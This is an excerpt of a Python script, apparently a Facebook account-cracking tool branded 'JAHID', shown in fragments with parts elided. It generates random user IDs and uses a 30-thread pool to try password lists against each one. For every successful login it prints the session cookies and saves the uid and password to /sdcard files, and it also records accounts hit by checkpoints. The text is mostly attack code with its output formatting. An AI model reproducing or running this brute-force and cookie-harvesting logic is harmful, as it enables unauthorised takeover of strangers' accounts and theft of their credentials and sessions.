...
def o():
    ...
    JAHID =input("\033[1;92m[\033[1;34m➢]\033[1;92mCHOOSE : ")
    if JAHID == '1':
    	C1()
    if JAHID == '2':
        C2()
...
\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM- trial
\033[1;32m[-] VERSION   :\033[1;32m 1.0
\033[1;32m[-] AUTHOR    :\033[1;32m JAHID
\033[1;32m[-] GITHUB    :\033[1;32m Jahid-444
\033[1;32m[-] FACEBOOK  :\033[1;32m Jahid-444
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS JAHID BRAND\033[;0m\033[1;91m═══>\033[1;92m """
...
def C2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=30) as JAHID:
        clear()
        tl = str(len(user))
        ...
        for love  in user:
            ...
            uid = code+love 
            JAHID.submit(rcrack1,uid,pwx,tl)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;96m[\033[1;92m[JAHID-OK]\033[1;96m[💚]\033[1;92m' +cid+'\033[1;92m●'+ps+'\033[1;94m<=>'+tahunng(cid))
                print ('\033[1;32m[‎🐸]\033[1;91m = \033[1;92m'+coki+ '')
                print ('\033[1;32m[‎💚]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                cek_apk(session,coki)
                open('/sdcard/JAHID-GMAIL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break 
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                ##print('\033[1;96m[JAHID.CP]\033[1;93m[😪]\033[1;96m'+cid+'='+ps+'\033[1;93m<=>'+tahunng(cid))
                print ('\033[1;32m[‎🍁]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                ...
                continue
        sys.stdout.write('\r%s[JAHID-%s/%s] \033[1;92m[OK-%s][CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    print ('')
        	    print('\033[38;5;46m[\033[1;92mJAHID\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
               ...
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/JAHID-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[JAHID.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/JAHID-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        loop+=1
        #sys.stdout.write('\r%s[JAHID]%s/%s][OK-%s]\033[1;92m[CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.write('\r%s[JAHID]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
